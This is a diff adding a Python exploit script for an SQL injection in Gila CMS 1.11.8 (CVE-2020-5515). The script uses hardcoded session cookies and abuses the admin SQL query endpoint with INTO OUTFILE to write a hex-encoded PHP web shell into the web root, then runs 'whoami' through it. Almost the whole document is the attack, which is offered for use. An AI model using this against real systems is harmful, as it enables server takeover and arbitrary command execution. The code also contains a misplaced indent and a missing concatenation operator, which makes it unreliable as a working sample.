@@ -1,0 +1,47 @@
+# Exploit Title: Gila CMS 1.11.8 - 'query' SQL Injection
+# Date: 2020-06-15
+# Exploit Author: Carlos Ramírez L. (BillyV4)
+# Vendor Homepage: https://gilacms.com/
+# Software Link: https://github.com/GilaCMS/gila/releases/tag/1.11.8
+# Version: Gila 1.11.8
+# Tested on: Gila 1.11.8
+# CVE : CVE-2020-5515
+
+import requests as req
+import time as vremeto
+import sys as sistemot
+import re as regularno
+
+if len(sistemot.argv) < 2:
+    print("Usage: ./CVE_2020_5515.py ip:port")
+    sistemot.exit(19)
+else:
+    ip = sistemot.argv[1]
+
+ cookies = {'PHPSESSID': 'r2k5bp52edr9ls36d35iohdlng', 'GSESSIONID': '21k2mbxockr9sf1v1agxkwpkt6ruzdl6vjz6fgmt7s0e72hlas'}
+
+
+webpath = "/gila-1.11.8/admin/sql?query="
+query1 = "SELECT id FROM user LIMIT 0,1 INTO OUTFILE "
+localpath = "\'C://xampp//htdocs//"
+shellname = "webshell.php\' "
+query2 = "LINES TERMINATED BY "
+
+
+print("[*] Injecting ")
+
+cmdphp  = "0x3c3f70687020696628697373657428245f524551554553545b27636d64275d29297"
+cmdphp += "b2024636d64203d2028245f524551554553545b27636d64275d293b2073797374656d"
+cmdphp += "2824636d64293b206563686f20273c2f7072653e24636d643c7072653e273b2064696"
+cmdphp += "53b207d203f3e"
+
+url = 'http://' + ip + webpath + query1 + localpath + shellname + query2 + cmdphp
+r = req.get(url, cookies=cookies)
+
+vremeto.sleep(1)
+
+print("[*] Executing")
+
+r = req.get("http://" + ip + "/" + shellname + "?cmd=whoami")
+
+print("You have a webshell in http://" + ip + "/" + shellname "?cmd=command")
